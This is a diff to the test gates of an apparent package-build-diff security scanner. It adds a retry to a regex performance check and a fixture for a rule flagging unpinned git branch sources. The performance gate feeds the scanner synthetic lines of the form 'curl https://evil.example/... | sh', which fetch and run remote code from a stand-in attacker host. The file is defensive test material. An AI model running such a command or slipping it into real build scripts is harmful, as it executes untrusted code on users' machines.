@@ -804,9 +804,18 @@ def gate_regex_input_is_bounded() -> Gate:
         f"+  curl https://evil{i}.example/{'p' * 180} | sh" for i in range(1000)
     )
     wide_diff = header + " build() {\n" + many + "\n+}\n"
-    wide_start = time.monotonic()
-    scan_diff(wide_diff, config=load_config(), package_name="demo")
-    wide_elapsed = time.monotonic() - wide_start
+    # Measured twice and kept at the minimum when the first run looks slow:
+    # this gate shares a machine with whatever else is running, and
+    # contention inflates a timing without ever deflating one. A rule that
+    # turned quadratic is slow on both attempts.
+    def _scan_seconds() -> float:
+        start = time.monotonic()
+        scan_diff(wide_diff, config=load_config(), package_name="demo")
+        return time.monotonic() - start
+
+    wide_elapsed = _scan_seconds()
+    if wide_elapsed >= 30.0:
+        wide_elapsed = min(wide_elapsed, _scan_seconds())
     if wide_elapsed >= 30.0:
         problems.append(
             f"{wide_elapsed:.1f}s for a 1000-line diff (budget 30s)"
@@ -1961,6 +1970,9 @@ def gate_declared_findings_fire_under_shipped_config() -> Gate:
         # weaker form, since a tag can be repointed.
         "P006": header + '+source=("https://ex.invalid/d/archive/v1.2.3.tar.gz")\n+sha256sums=(\'SKIP\')\n',
         "P007": header + '+source=("https://github.com/d/d/archive/v1.tar.gz")\n',
+        # A branch ref: makepkg resolves it when the package is built, so
+        # what this compiles is whatever upstream has published by then.
+        "P008": header + '+source=("git+https://ex.invalid/d.git#branch=main")\n',
     }
 
     problems = []
